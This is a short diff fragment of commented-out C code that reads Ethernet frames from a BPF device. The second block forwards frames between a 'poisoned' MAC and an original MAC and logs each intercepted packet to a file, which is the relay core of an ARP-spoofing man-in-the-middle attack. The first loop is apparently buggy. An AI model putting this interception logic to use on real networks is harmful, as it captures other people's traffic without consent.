@@ -1,0 +1,52 @@
+     /*
+      if( (read_bytes = read( bpf, bpf_buf, buf_len ) ) > 0 )
+	{
+	  printf( "- Read %i bytes\n", read_bytes );
+	  
+	  // process first packet
+	  // ...
+
+	  sum = bpf_buf->bh_hdrlen + bpf_buf->bh_caplen;
+	  int i = 1;
+	  printf( "- 1 <--> sum = %i\n", sum );
+	  
+	  while( sum < read_bytes )
+	    {	      
+	      i++;
+	      bpf_packet = (bpf_hdr*)((char*) bpf_buf + BPF_WORDALIGN( bpf_buf->bh_hdrlen + bpf_buf->bh_caplen ));
+	      sum += bpf_buf->bh_hdrlen + bpf_buf->bh_caplen;
+	      printf( "- %i <--> sum = %i\n", i, sum );
+		      
+	    }
+	}
+      */
+
+      /*
+
+      // Read from the BPF device until data arrives
+      
+      if( read( bpf, bpf_buf, buf_len ) > 0 )
+	{
+	  frame = (ethernet_frame*) ( (char*) bpf_buf + bpf_buf->bh_hdrlen);
+	  
+	  // a packet from the server (client1)
+	  
+	  if( memcmp( frame->src_addr, poisoned_mac, 6 ) == 0 )
+	    {
+	      memcpy( frame->dest_addr, original_mac, 6 );
+	      write( bpf, frame, bpf_buf->bh_caplen );
+	      write( log, (char*)bpf_buf + bpf_buf->bh_hdrlen, bpf_buf->bh_caplen );
+	    }
+
+	  // a packet from the client (client2 )
+	  
+	  else if( memcmp( frame->src_addr, original_mac, 6 ) == 0 )
+	    {
+	      memcpy( frame->dest_addr, poisoned_mac, 6 );
+	      write( bpf, frame, bpf_buf->bh_caplen );
+	      write( log, (char*)bpf_buf + bpf_buf->bh_hdrlen, bpf_buf->bh_caplen );
+	    }
+	  
+	}
+      
+      */
